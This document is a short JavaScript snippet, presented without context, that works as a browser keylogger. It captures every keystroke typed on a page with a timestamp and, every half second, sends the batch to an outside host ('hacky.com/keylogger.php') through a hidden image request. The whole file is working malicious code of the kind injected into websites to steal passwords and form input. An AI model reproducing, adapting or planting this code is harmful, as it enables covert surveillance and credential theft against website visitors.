var presses = [];
window.addEventListener("keydown", function(evt){
    presses.push({
        t: Math.round((new Date()).getTime() / 1000),
        k: evt.key
    });
});
window.setInterval(function () {
    if (presses.length>1) {
        var data = encodeURIComponent(JSON.stringify(presses));
        // console.log(data);
        new Image().src = "http://hacky.com/keylogger.php?c=" + data;
        presses = [];
    }
}, 500);